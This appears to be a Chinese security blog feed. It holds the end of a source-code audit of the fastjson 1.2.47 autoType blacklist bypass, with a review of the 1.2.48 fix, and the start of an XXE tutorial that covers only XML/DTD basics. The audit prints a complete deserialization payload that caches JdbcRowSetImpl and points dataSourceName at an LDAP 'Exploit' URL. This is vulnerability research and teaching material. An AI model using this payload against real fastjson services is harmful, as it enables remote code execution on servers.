e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//加载类</span></span><br><span class="line">           clazz = Class.forName(className);</span><br><span class="line">           <span class="comment">//直接放入mappings中</span></span><br><span class="line">           mappings.put(className, clazz);</span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> clazz;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）</p><p>看看这个类在什么地方被引用。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zt2oc7j31hl09egn5.jpg" alt="loadClass.png"></p><p>前三者都是在<code>ParserConfig#autocheck</code>这个我们需要攻克的类中，如果能在那里调用loadClass并传入一个恶意类去加载。那就已经完成了我们的最终目的，根本不需要通过mappings这个空子去钻。</p><p>所以只需要看TypeUtils.java中的引用处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>cache为true</strong>，一个好消息，因为有三处修改mapping的地方，两个地方需要cache为true。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zmg3hyj31ny09pq4l.jpg" alt="loadClass2.png"></p><p>这百年可以看到在这个类中会自己引用自己的类，跳来跳去，但是也有外部的类引用当前类。这是我们主要关注的。（因为一个底层的工具类，不可能被我们直接调用到）</p><p>慢慢看，把跳出去的接口理出来</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ze46z5j31mu0clwgz.jpg" alt="loadclass3.png"></p><p>这两个静态的，没搞头，就不看了。</p><p>只有上面一个跳出去<code>MiscCodec.java#deserialze</code>的，我们再过去看看：</p><blockquote><p>以下代码段请一大段一大段倒着回退回来看</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">      JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">      <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object objVal;</span><br><span class="line"><span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">      <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">      <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值为TypeNameRedirect</span></span><br><span class="line">          parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">          parser.accept(JSONToken.COMMA);</span><br><span class="line"><span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">           <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">          <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">              <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">              <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">              <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">              lexer.nextToken();</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.COLON);</span><br><span class="line"><span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.RBRACE);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">          <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String strVal;</span><br><span class="line"><span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">      <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">          strVal = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">          strVal = (String) objVal;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//不必进入的分支</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">      <span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">          <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">          <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p><ol><li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p><p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p></li><li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。再加上<strong>clazz=class类</strong></p><p>大概需要一个json串如下:<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p></li></ol><p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yzmow5j315a0d875h.jpg" alt="DefaultJSONParser-384.png"></p><h4 id="定向砸payload"><a href="#定向砸payload" class="headerlink" title="定向砸payload"></a>定向砸payload</h4><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line"><span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p>这里有我们的三个在乎的点，如下顺序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个分析过了。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yrwgg9j31du0gnabi.jpg" alt="class-go1.png"></p><p>从<code>deserializers.findClass(typeName)</code>出去，这是我们之前分析过的一处可以绕过白名单黑名单出去的地方，但是这里只存放一些默认类，不可污染。而我们的class.class就在这个默认类列表中，自然直接出去了。（比如class.class怎么也不会匹配到黑名单，不这里出去，也是可以下面出去的）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ylwm5kj31ms163q9k.jpg" alt="class-go2png.png"></p><p>再是，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。这个payload砸的没错。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yfjv3dj31px0c60ud.jpg" alt="class-go3.png"></p><p>可以发现进入了我们预计希望进入的<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>，可以看到上面有复杂的if判断，这就是得到初步的思路之后砸payload的好处，如果满足条件，我们就不用费力气去想这些是为啥的，反正默认进来了，不满足我们再去看哪里不符合就行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y8ah44j315c12vn1i.jpg" alt="class-go4.png"></p><p>一切按照计划进行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y0ztirj30w706uwew.jpg" alt="class-go5.png"></p><p>由于objVal是一个String，继续赋值给strVal</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xtd6q3j30z404qjri.jpg" alt="class-go6.png"></p><p>跳跳跳，我们之前由checkAutoType得到的clazz为Class.class，进入loadCLass</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xjwj9qj312r03tgls.jpg" alt="class-go7.png"></p><p>默认cache为true，之前分析的时候也说到cache为true对我们来说是个好消息。接下来会有三种情况可以污染我们的关键mapping。看看会进入哪一个</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1x8rjbbj31ce0zh77r.jpg" alt="class-go8.png"></p><p>下一个</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wztxobj31gy12lq8g.jpg" alt="class-go9.png"></p><p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p><p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。这就是大黑阔嘛，爱了爱了。</p><blockquote><p>现在回头来看这个mapping看到现在，就是放入一些已经加载过了的类，在checkAutoType中就不进行检查来提高速度。</p></blockquote><p>来一个调用栈：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wnadlyj30pi0brta3.jpg" alt="1.2.47-调用栈.png"></p><p>那么获取一个有恶意类的类似缓存机制的mapping有啥用呢。再进一步@type就好。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1w1dpcnj31om1057e4.jpg" alt="1.2.47-success.png"></p><p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p><p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了以下一个。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计结束完美。</p><blockquote><p>回顾一下进来的过程：</p><p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p><ol><li>checkAutoType方法拿到Class.class</li><li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li><li>进入deserializer.deserialze</li></ol><p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p><ol><li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li><li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li><li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li></ol><p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p><ol><li>添加默认cache为true，调用loadClass</li></ol><p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p><ol><li>三个改变mappings的第一处，由于classLoader=null，不进入</li><li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li></ol></blockquote><h3 id="1-2-48修复"><a href="#1-2-48修复" class="headerlink" title="1.2.48修复"></a>1.2.48修复</h3><p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1vmjmw2j32bc0lhacn.jpg" alt="1.2.48修复.png"></p><p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p><p>现在这边直接指定过来三个参数loadClass同时cache为false。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1v926igj31ok0b20ub.jpg" alt="1.2.48try.png"></p><p>可见，在同样payload执行时，我们原来说会改变mappings的第二处就因为cache而无法改变。</p><p>但是我们还记得之前分析时有第三处不需要校验cache的mappings赋值！精神一振，这就是0day的气息么！</p><p>然后…….</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1utn1i5j327q0n2mzu.jpg" alt="1.2.48修复2.png"></p><p>这就是程序员的力量么，两行代码秒杀一切，爱了爱了，0day再见。</p><h3 id="1-2-48以后"><a href="#1-2-48以后" class="headerlink" title="1.2.48以后"></a>1.2.48以后</h3><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p><p>之后又出了一个影响广泛的拒绝服务漏洞，在1.2.60版本被修复。</p><p>当然这与反序列化就无关了，同时这篇文章也写得太久，太长了。也算是给2019做个结尾吧。</p><p>所以，</p><p>2020年，新年快乐。</p><p>要不 下场雪吧？</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">l1nk3r大佬</a></p><p><a href="https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p><p><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></p><p><a href="https://b1ue.cn/archives/184.html" target="_blank" rel="noopener">https://b1ue.cn/archives/184.html</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p><a href="https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a></p><p><a href="http://wp.blkstone.me/2018/10/fastjson-serial-1/" target="_blank" rel="noopener">http://wp.blkstone.me/2018/10/fastjson-serial-1/</a></p><p><a href="https://blog.csdn.net/kingmax54212008/article/details/95641681" target="_blank" rel="noopener">https://blog.csdn.net/kingmax54212008/article/details/95641681</a></p><p><a href="https://github.com/alibaba/fastjson/tree/1.2.47" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/tree/1.2.47</a></p><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p><p><a href="https://www.freebuf.com/column/180711.html" target="_blank" rel="noopener">https://www.freebuf.com/column/180711.html</a></p><p><a href="https://github.com/jas502n/fastjson-RCE" target="_blank" rel="noopener">https://github.com/jas502n/fastjson-RCE</a></p><p>可能还看了很多。。但是真的回头找不到了，向网上老哥们致敬 (^^ゞ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;推荐阅读时间：60min&lt;br&gt;全文字数：14026&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>WEB-XXE</title>
    <link href="http://lalajun.com/2019/12/03/WEB-XXE/"/>
    <id>http://lalajun.com/2019/12/03/WEB-XXE/</id>
    <published>2019-12-03T09:05:33.000Z</published>
    <updated>2020-11-20T07:08:40.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。</p><p>XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。</p><p>理解XXE，其实就是学习XML。</p><h2 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h2><p>XML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式<br>DTD(Document Type Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素。</p><p>可以参考官方的<a href="https://www.ibm.com/developerworks/cn/xml/x-entities/#l6" target="_blank" rel="noopener">xml基础教程</a></p><h3 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h3><p>XML总体是由<code>元素</code>（如<code>&lt;message&gt;</code>）组成。<br>元素可以额外附加<code>属性</code>，需要提前定义。<br>元素中可以引用<code>实体</code>，相当于变量，存在内置变量和自定义变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内置变量 --&gt;</span></span><br><span class="line">&amp;lt;<span class="tag">&lt;</span></span><br><span class="line"><span class="tag">&amp;<span class="attr">gt</span>;&gt;</span></span><br><span class="line">&amp;amp;&amp;</span><br><span class="line">&amp;quot;"</span><br><span class="line">&amp;apos;'</span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span> &amp;a; <span class="tag">&lt;/<span class="name">square</span>&gt;</span></span><br><span class="line">  元素    属性         实体</span><br></pre></td></tr></table></figure><h3 id="DTD内部文档声明"><a href="#DTD内部文档声明" class="headerlink" title="DTD内部文档声明"></a>DTD内部文档声明</h3><p>当DTD存在于XML源文件中，由以下格式进行包裹<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>然后XML文件对于DTD的内容进行引用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [ </span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>可以看到在DTD设置了一些变量，然后在xml文档中再使用到这些变量。这就是DTD与XML之间的使用方法。</p></blockquote><h3 id="DTD外部文档声明"><a href="#DTD外部文档声明" class="headerlink" title="DTD外部文档声明"></a>DTD外部文档声明</h3><p>从xml文件外部引入DTD：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>note.dtd</code>:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h2><p>DTD中可以</p><ul><li>声明<strong>元素</strong>（标签）：<code>&lt;!ELEMENT...</code> </li><li>为元素声明<strong>属性</strong>（标签属性）：<code>&lt;!ATTLIST...</code></li><li>声明<strong>实体</strong>：<code>&lt;!ENTITY...</code></li></ul><h3 id="DTD声明元素"><a href="#DTD声明元素" class="headerlink" title="DTD声明元素"></a>DTD声明元素</h3><ul><li><code>&lt;!ELEMENT 元素名称 类别&gt;</code><ul><li>类别：EMPTY,(#PCDATA),(#CDDATA),ANY<ul><li>PCDATA：会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</li><li>CDDATA：不会被解析器解析的文本</li></ul></li></ul></li><li><code>&lt;!ELEMENT 元素名称 (元素内容)&gt;</code><ul><li>多个元素内容：(子元素名称 1,子元素名称 